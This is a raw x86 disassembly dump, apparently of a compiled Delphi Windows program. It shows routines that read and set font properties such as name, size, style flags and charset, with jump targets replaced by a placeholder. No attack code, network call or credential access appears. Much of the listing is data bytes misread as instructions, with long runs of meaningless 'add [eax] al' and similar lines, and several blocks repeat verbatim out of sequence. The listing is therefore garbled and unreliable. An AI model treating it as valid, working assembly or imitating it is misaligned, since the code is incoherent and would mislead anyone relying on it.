retn
popad
jo r-xdata
inc [ ebx - 0x23fbdbbc ]
jmp sub_405a70
outsd
je r-xdata
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_463d6f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add [ edi ] dl
cmp [ esi ] al
and [ eax ] edi
inc esi
add [ ebx ] ch
cmp [ esi ] al
or edi [ eax ]
inc esi
add [ edx ] al
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
jb r-xdata
inc esi
add bh dh
inc esi
add [ ecx ] al
aaa
inc esi
add [ ebx ] cl
aaa
inc esi
add bl ch
inc esi
add [ edx ] al
add [ eax ] al
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ edi ] 0x20004637
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
add cl ah
inc esi
add [ ebp - 0x3affb9ca ] bh
imul sp [ ebp + 0x72 ] 0x408d
add ah cl
add eax 0xffffffe0
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
div [ edi ]
inc esi
add [ ecx ] al
cmp [ esi ] al
fnsave [ edi ]
inc esi
add ch ah
aaa
inc esi
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x3838da82
inc esi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x384cda82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x38
inc esi
add [ eax + edi + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
cmp [ esi ] al
sub [ eax ] al
add [ eax ] al
jo r-xdata
cmp eax 0x372bda82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
les esi [ edi ]
inc esi
add [ ebx ] bh
aaa
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
aaa
inc esi
add [ eax ] ch
add [ eax ] al
add [ eax + 0x35 ] dh
inc esi
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
sbb al 0x3c
inc esi
add [ edi + edi + 0x3dd40046 ] bl
inc esi
add [ esp + edx * 2 ] cl
inc esi
outsd
outsb
je r-xdata
scasd [ edi ]
inc eax
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46426d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
popad
jo r-xdata
inc esi
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
sbb al 0x3c
inc esi
add [ eax + 0x3c ] cl
inc esi
add [ eax + 0x43 ] cl
inc esi
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_4059e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464274
lea eax [ ebp - 0x2c ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_40599c
lea eax [ ebp - 0x4 ]
call sub_404678
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_4230c8
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4047c4
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_4047d4
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_42313c
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_423178
test al 0x1
je r-xdata
inc esi
add [ eax + 0x48 ] bl
inc esi
add [ eax + 0x48 ] bh
inc esi
add [ esi + edx * 2 ] al
inc edx
add [ eax + ecx * 2 + 0x49040046 ] bh
inc esi
add [ esi + edx * 2 + 0x42 ] ch
add [ ecx + ecx * 2 ] ah
inc esi
add [ esi + edx * 2 + 0x42 ] bh
add [ ebx + edx * 2 + 0x42 ] al
add [ ecx + ecx * 2 + 0x46 ] ch
add [ eax ] dl
push esi
inc edx
add [ eax + 0x49 ] dh
inc esi
add al al
dec ecx
inc esi
add [ edx + ecx * 2 + 0x46 ] al
add [ eax + 0xe00464a ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
jbe r-xdata
jb r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4059e0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
add [ eax ] ch
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax + ebp * 4 ] ah
inc ecx
add ah ch
push ebx
inc edx
add [ esi + eax * 2 ] bl
inc esi
add [ ecx + ebp * 4 + 0x41 ] dh
add [ eax + 0x46 ] dl
inc esi
add [ esi + eax * 2 + 0x46 ] dl
add [ eax ] bh
push esp
inc edx
add [ eax + 0x47 ] ah
inc esi
add ah dl
inc edi
inc esi
add [ eax + ecx * 2 ] bh
cmp [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmp [ esi ] eax
sar [ ecx ] 0x1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2c004639 ] bh
add [ eax ] al
add [ edx + ebx + 0x42 ] ch
add [ esp + esi + 0x40 ] ah
add ah ah
test al 0x41
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edi ] dl
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_464479
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_429890
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_4298c4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40321c
retn
mov eax [ ebx + 0x1c ]
call sub_4231e0
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_423178
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_423178
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_423178
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_40599c
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_464bcc
call sub_461ccc
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_463c54
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
jpo r-xdata
jo r-xdata
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_425c9c
call sub_429b14
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
cli
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov eax [ r-xdata ]
call sub_463d98
imul esp [ ebx - 0x75 ] 0x4639d0c0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
mov eax esi
call sub_425cb4
call sub_4266e4
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426458
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_464589
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4260b4
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4260cc
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426124
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46455d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_42397c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464564
mov eax [ ebp - 0x18 ]
call sub_40321c
retn
mov eax [ ebp - 0x8 ]
call sub_40599c
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_464be8
call sub_461ccc
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_463c54
mov ecx r-xdata
call sub_4059e0
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_4059b4
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
imul esp [ ebx + 0x48 ] 0x30004639
sbb eax [ edx ]
add [ eax ] al
pop es
inc ecx
js r-xdata
mov dl 0x1
je r-xdata
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x56 ] 0xd88bf28b
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
insb
jae r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_4059e0
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46430c
mov edx eax
test edx edx
je r-xdata
call sub_4033a8
test al al
je r-xdata
add [ ebp - 0x17acffc0 ] cl
and ch dh
stc
dec [ ebx - 0x743c7428 ]
adc eax r-xdata
lea eax [ ebx + 0x18 ]
call sub_4059b4
sub edx 0xffffffdc
sub_463838
in eax dx
aaa
inc esi
add bh dh
aaa
inc esi
add [ ecx ] al
cmp [ esi ] al
fnsave [ edi ]
inc esi
add ch ah
aaa
inc esi
add [ edi ] dl
cmp [ esi ] al
and [ eax ] edi
inc esi
add [ ebx ] ch
cmp [ esi ] al
or edi [ eax ]
inc esi
add [ edx ] al
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
div [ edi ]
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x3838da82
inc esi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x384cda82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x38
inc esi
add [ eax + edi + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
cmp [ esi ] al
sub [ eax ] al
add [ eax ] al
jo r-xdata
popad
jo r-xdata
inc esi
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
sbb al 0x3c
inc esi
add [ eax + 0x3c ] cl
inc esi
add [ eax + 0x43 ] cl
inc esi
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
inc esi
add [ eax + 0x48 ] bl
inc esi
add [ eax + 0x48 ] bh
inc esi
add [ esi + edx * 2 ] al
inc edx
add [ eax + ecx * 2 + 0x49040046 ] bh
inc esi
add [ esi + edx * 2 + 0x42 ] ch
add [ ecx + ecx * 2 ] ah
inc esi
add [ esi + edx * 2 + 0x42 ] bh
add [ ebx + edx * 2 + 0x42 ] al
add [ ecx + ecx * 2 + 0x46 ] ch
add [ eax ] dl
push esi
inc edx
add [ eax + 0x49 ] dh
inc esi
add al al
dec ecx
inc esi
add [ edx + ecx * 2 + 0x46 ] al
add [ eax + 0xe00464a ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
jbe r-xdata
jb r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
add [ eax ] ch
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax + ebp * 4 ] ah
inc ecx
add ah ch
push ebx
inc edx
add [ esi + eax * 2 ] bl
inc esi
add [ ecx + ebp * 4 + 0x41 ] dh
add [ eax + 0x46 ] dl
inc esi
add [ esi + eax * 2 + 0x46 ] dl
add [ eax ] bh
push esp
inc edx
add [ eax + 0x47 ] ah
inc esi
add ah dl
inc edi
inc esi
add [ eax + ecx * 2 ] bh
cmp [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmp [ esi ] eax
sar [ ecx ] 0x1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2c004639 ] bh
add [ eax ] al
add [ edx + ebx + 0x42 ] ch
add [ esp + esi + 0x40 ] ah
add ah ah
test al 0x41
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edi ] dl
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
jpo r-xdata
jo r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
cli
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov eax [ r-xdata ]
call sub_463d98
imul esp [ ebx - 0x75 ] 0x4639d0c0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
mov ecx r-xdata
call sub_4059e0
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_4059b4
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
imul esp [ ebx + 0x48 ] 0x30004639
sbb eax [ edx ]
add [ eax ] al
pop es
inc ecx
js r-xdata
mov dl 0x1
je r-xdata
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x56 ] 0xd88bf28b
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
insb
jae r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_4059e0
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46430c
mov edx eax
test edx edx
je r-xdata
call sub_4033a8
test al al
je r-xdata
add [ ebp - 0x17acffc0 ] cl
and ch dh
stc
dec [ ebx - 0x743c7428 ]
adc eax r-xdata
lea eax [ ebx + 0x18 ]
call sub_4059b4
sub edx 0xffffffdc
sub_4639f4
push ebx
call sub_40281c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_463a20
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x20 ]
mov ecx r-xdata
call sub_4059e0
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_463d98
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x20 ]
call sub_4059b4
sub edx 0xffffffdc
sub_463a70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_4059e0
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46430c
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_4059b4
sub edx 0xffffffdc
sub_463ac0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463b03
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_463a20
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463b0a
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_463b10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405a10
xor eax eax
push ebp
push sub_463b6a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_463a20
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463b71
lea eax [ ebp - 0x8 ]
call sub_40599c
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_463b78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463bbb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_463a70
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463bc2
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_463bc8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_463d08
mov edx eax
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403540
lea eax [ esi + 0x14 ]
call sub_4059b4
mov eax esi
test bl bl
je r-xdata
sub edx 0xfffffff8
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_463c1c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_463cd8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_463c54
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405a10
xor eax eax
push ebp
push sub_463cbc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_463cd8
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4059b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463cc3
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
lea eax [ ebx + 0x10 ]
push eax
mov edx r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_461ed8
sub_463d08
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_463d98
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_463bc8
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_463dd4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463f78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463f7f
lea eax [ ebp - 0x28 ]
call sub_403f6c
lea eax [ ebp - 0x24 ]
call sub_40599c
lea eax [ ebp - 0xc ]
call sub_404678
retn
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4059e0
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_404678
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov bl [ r-xdata ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x4
lea eax [ ebp - 0x1e ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ce4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_463f4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
call sub_4041f4
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_4230e0
fild [ ebp - 0x18 ]
fdiv [ r-xdata ]
call sub_4029ec
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_423158
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_423184
mov dl [ ebp - 0x1e ]
mov eax [ ebp - 0x8 ]
call sub_4231e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
or bl 0x8
sub_463f9c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46411a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_403f6c
lea eax [ ebp - 0xc ]
call sub_404678
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_4640ed
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4059e0
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4230c8
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4047c4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42313c
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423178
test al 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423178
test al 0x2
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423178
test al 0x4
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423178
test al 0x8
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4231e0
and eax 0xff
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
